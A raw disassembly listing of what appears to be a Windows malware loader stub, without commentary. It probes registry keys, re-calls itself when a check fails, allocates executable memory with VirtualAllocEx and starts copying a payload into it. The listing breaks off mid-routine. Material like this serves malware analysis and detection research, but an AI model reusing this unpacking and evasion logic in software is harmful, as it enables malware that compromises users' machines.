0x0041a910:	pushl	%ebp	; from: 0x0041ad3e(MAY)
0x0041a911:	movl	%esp, %ebp
0x0041a913:	subl	$0xc, %esp
0x0041a916:	movl	$0x1e4dc, -8(%ebp)
0x0041a91d:	movl	$0x3000, -12(%ebp)
0x0041a924:	movl	$0x40, -4(%ebp)
0x0041a92b:	movl	-4(%ebp), %eax
0x0041a92e:	pushl	%eax
0x0041a92f:	movl	-12(%ebp), %ecx
0x0041a932:	pushl	%ecx
0x0041a933:	movl	0x8(%ebp), %edx
0x0041a936:	pushl	%edx
0x0041a937:	pushl	$0x0
0x0041a939:	pushl	$0xffffffff
0x0041a93b:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000920(MAY)
0x0041a941:	movl	%ebp, %esp
0x0041a943:	popl	%ebp
0x0041a944:	ret	; targets: 0x0041ad43(MAY)

0x0041a950:	pushl	%ebp	; from: 0x0041ad53(MAY)
0x0041a951:	movl	%esp, %ebp
0x0041a953:	popl	%ebp
0x0041a954:	ret	; targets: 0x0041ad58(MAY)

0x0041a960:	pushl	%ebp	; from: 0x0041ad71(MAY)
0x0041a961:	movl	%esp, %ebp
0x0041a963:	subl	$0x8, %esp
0x0041a966:	movl	0x8(%ebp), %eax
0x0041a969:	movl	%eax, -4(%ebp)
0x0041a96c:	movl	0xc(%ebp), %ecx
0x0041a96f:	movl	%ecx, -8(%ebp)
0x0041a972:	movl	-4(%ebp), %edx
0x0041a975:	cmpl	-8(%ebp), %edx
0x0041a978:	jae	0x0041a981	; targets: 0x0041a97a(MAY)
0x0041a97a:	movl	-4(%ebp), %eax	; from: 0x0041a978(MAY)
0x0041a97d:	jmp	0x0041a984	; targets: 0x0041a984(MAY)
0x0041a984:	movl	%ebp, %esp	; from: 0x0041a97d(MAY)
0x0041a986:	popl	%ebp
0x0041a987:	ret	; targets: 0x0041ad76(MAY)

0x0041a990:	pushl	%ebp	; from: 0x0041aca6(MAY)
0x0041a991:	movl	%esp, %ebp
0x0041a993:	movl	$0x401004, 0x0041d9b4
0x0041a99d:	popl	%ebp
0x0041a99e:	ret	; targets: 0x0041acab(MAY)

0x0041a9b0:	pushl	%ebp	; from: 0x0041ad2f(MAY)
0x0041a9b1:	movl	%esp, %ebp
0x0041a9b3:	movl	0x8(%ebp), %eax
0x0041a9b6:	movl	-4(%eax), %eax
0x0041a9b9:	popl	%ebp
0x0041a9ba:	ret	; targets: 0x0041ad34(MAY)

0x0041abb0:	pushl	%ebp	; from: 0x0041ac4b(MAY), 0x0041aca1(MAY), 0x0041ac76(MAY), 0x0041ac1a(MAY), 0x0041abee(MAY), 0x0041ad24(MAY)
0x0041abb1:	movl	%esp, %ebp
0x0041abb3:	subl	$0xc, %esp
0x0041abb6:	movl	$0x41c018, -4(%ebp)
0x0041abbd:	movl	RegOpenKeyExA@advapi32.dll, %eax
0x0041abc2:	movl	%eax, 0x0041dabc
0x0041abc7:	leal	-12(%ebp), %ecx
0x0041abca:	pushl	%ecx
0x0041abcb:	pushl	$0x20019
0x0041abd0:	pushl	$0x0
0x0041abd2:	pushl	$0x41d9b0
0x0041abd7:	pushl	$0x80000002
0x0041abdc:	call	0x0041dabc	; targets: 0xff000960(MAY)
0x0041abe2:	testl	%eax, %eax
0x0041abe4:	je	0x0041abf3	; targets: 0x0041abf3(MAY), 0x0041abe6(MAY)
0x0041abe6:	pushl	$0x1	; from: 0x0041abe4(MAY)
0x0041abe8:	pushl	$0x1
0x0041abea:	pushl	$0x1
0x0041abec:	pushl	$0x1
0x0041abee:	call	0x0041abb0	; targets: 0x0041abb0(MAY)
0x0041abf3:	leal	-12(%ebp), %edx	; from: 0x0041abe4(MAY)
0x0041abf6:	pushl	%edx
0x0041abf7:	pushl	$0x20019
0x0041abfc:	pushl	$0x0
0x0041abfe:	pushl	$0x41d9b1
0x0041ac03:	pushl	$0x80000002
0x0041ac08:	call	0x0041dabc	; targets: 0xff000960(MAY)
0x0041ac0e:	testl	%eax, %eax
0x0041ac10:	je	0x0041ac1f	; targets: 0x0041ac1f(MAY), 0x0041ac12(MAY)
0x0041ac12:	pushl	$0x1	; from: 0x0041ac10(MAY)
0x0041ac14:	pushl	$0x1
0x0041ac16:	pushl	$0x1
0x0041ac18:	pushl	$0x1
0x0041ac1a:	call	0x0041abb0	; targets: 0x0041abb0(MAY)
0x0041ac1f:	movl	-4(%ebp), %eax	; from: 0x0041ac10(MAY)
0x0041ac22:	movb	$0x4f, 0x1(%eax)
0x0041ac26:	leal	-12(%ebp), %ecx
0x0041ac29:	pushl	%ecx
0x0041ac2a:	pushl	$0x20019
0x0041ac2f:	pushl	$0x0
0x0041ac31:	movl	-4(%ebp), %edx
0x0041ac34:	pushl	%edx
0x0041ac35:	movl	-12(%ebp), %eax
0x0041ac38:	pushl	%eax
0x0041ac39:	call	0x0041dabc	; targets: 0xff000960(MAY)
0x0041ac3f:	testl	%eax, %eax
0x0041ac41:	je	0x0041ac50	; targets: 0x0041ac50(MAY), 0x0041ac43(MAY)
0x0041ac43:	pushl	$0x1	; from: 0x0041ac41(MAY)
0x0041ac45:	pushl	$0x1
0x0041ac47:	pushl	$0x1
0x0041ac49:	pushl	$0x1
0x0041ac4b:	call	0x0041abb0	; targets: 0x0041abb0(MAY)
0x0041ac50:	leal	-12(%ebp), %ecx	; from: 0x0041ac41(MAY)
0x0041ac53:	pushl	%ecx
0x0041ac54:	pushl	$0x20019
0x0041ac59:	pushl	$0x0
0x0041ac5b:	pushl	$0x41c024
0x0041ac60:	movl	-12(%ebp), %edx
0x0041ac63:	pushl	%edx
0x0041ac64:	call	0x0041dabc	; targets: 0xff000960(MAY)
0x0041ac6a:	testl	%eax, %eax
0x0041ac6c:	je	0x0041ac7b	; targets: 0x0041ac6e(MAY), 0x0041ac7b(MAY)
0x0041ac6e:	pushl	$0x1	; from: 0x0041ac6c(MAY)
0x0041ac70:	pushl	$0x1
0x0041ac72:	pushl	$0x1
0x0041ac74:	pushl	$0x1
0x0041ac76:	call	0x0041abb0	; targets: 0x0041abb0(MAY)
0x0041ac7b:	leal	-12(%ebp), %eax	; from: 0x0041ac6c(MAY)
0x0041ac7e:	pushl	%eax
0x0041ac7f:	pushl	$0x20019
0x0041ac84:	pushl	$0x0
0x0041ac86:	pushl	$0x41c064
0x0041ac8b:	movl	-12(%ebp), %ecx
0x0041ac8e:	pushl	%ecx
0x0041ac8f:	call	0x0041dabc	; targets: 0xff000960(MAY)
0x0041ac95:	testl	%eax, %eax
0x0041ac97:	jne	0x0041aca6	; targets: 0x0041aca6(MAY), 0x0041ac99(MAY)
0x0041ac99:	pushl	$0x1	; from: 0x0041ac97(MAY)
0x0041ac9b:	pushl	$0x1
0x0041ac9d:	pushl	$0x1
0x0041ac9f:	pushl	$0x1
0x0041aca1:	call	0x0041abb0	; targets: 0x0041abb0(MAY)
0x0041aca6:	call	0x0041a990	; targets: 0x0041a990(MAY)	; from: 0x0041ac97(MAY)
0x0041acab:	movl	%ebp, %esp	; from: 0x0041a99e(MAY)
0x0041acad:	popl	%ebp
0x0041acae:	ret	$0x10	; targets: 0x0041ad29(MAY)


start:
0x0041acc0:	pushl	%ebp
0x0041acc1:	movl	%esp, %ebp
0x0041acc3:	subl	$0x70, %esp
0x0041acc6:	movl	%ebp, 0x0041dac0
0x0041accc:	pusha	
0x0041accd:	movl	$0x0, -60(%ebp)
0x0041acd4:	movl	$0x80000002, -80(%ebp)
0x0041acdb:	movl	$0x0, -20(%ebp)
0x0041ace2:	movl	$0x64, -52(%ebp)
0x0041ace9:	movl	$0x12, -28(%ebp)
0x0041acf0:	movl	$0x0, -60(%ebp)
0x0041acf7:	movl	$0x0, -36(%ebp)
0x0041acfe:	movl	$0x1, -48(%ebp)
0x0041ad05:	movl	$0x3, -24(%ebp)
0x0041ad0c:	pushl	$0x104
0x0041ad11:	pushl	$0x41d9b8
0x0041ad16:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000940(MAY)
0x0041ad1c:	pushl	$0x2
0x0041ad1e:	pushl	$0x2
0x0041ad20:	pushl	$0x2
0x0041ad22:	pushl	$0x2
0x0041ad24:	call	0x0041abb0	; targets: 0x0041abb0(MAY)
0x0041ad29:	movl	0x0041d9b4, %eax	; from: 0x0041acae(MAY)
0x0041ad2e:	pushl	%eax
0x0041ad2f:	call	0x0041a9b0	; targets: 0x0041a9b0(MAY)
0x0041ad34:	addl	$0x4, %esp	; from: 0x0041a9ba(MAY)
0x0041ad37:	movl	%eax, -64(%ebp)
0x0041ad3a:	movl	-64(%ebp), %ecx
0x0041ad3d:	pushl	%ecx
0x0041ad3e:	call	0x0041a910	; targets: 0x0041a910(MAY)
0x0041ad43:	addl	$0x4, %esp	; from: 0x0041a944(MAY)
0x0041ad46:	movl	%eax, -56(%ebp)
0x0041ad49:	movl	-64(%ebp), %edx
0x0041ad4c:	pushl	%edx
0x0041ad4d:	pushl	$0x0
0x0041ad4f:	movl	-56(%ebp), %eax
0x0041ad52:	pushl	%eax
0x0041ad53:	call	0x0041a950	; targets: 0x0041a950(MAY)
0x0041ad58:	addl	$0xc, %esp	; from: 0x0041a954(MAY)
0x0041ad5b:	movl	-64(%ebp), %ecx
0x0041ad5e:	movl	%ecx, -72(%ebp)
0x0041ad61:	movl	-60(%ebp), %edx
0x0041ad64:	cmpl	-64(%ebp), %edx
0x0041ad67:	jae	0x0041adb8	; targets: 0x0041ad69(MAY)
0x0041ad69:	movl	-72(%ebp), %eax	; from: 0x0041ad67(MAY)
0x0041ad6c:	pushl	%eax
0x0041ad6d:	movl	-52(%ebp), %ecx
0x0041ad70:	pushl	%ecx
0x0041ad71:	call	0x0041a960	; targets: 0x0041a960(MAY)
0x0041ad76:	addl	$0x8, %esp	; from: 0x0041a987(MAY)
0x0041ad79:	movl	%eax, -76(%ebp)
0x0041ad7c:	movl	-76(%ebp), %edx
0x0041ad7f:	pushl	%edx
0x0041ad80:	movl	0x0041d9b4, %eax
0x0041ad85:	addl	-36(%ebp), %eax
0x0041ad88:	pushl	%eax
0x0041ad89:	movl	-56(%ebp), %ecx
0x0041ad8c:	addl	-60(%ebp), %ecx
0x0041ad8f:	pushl	%ecx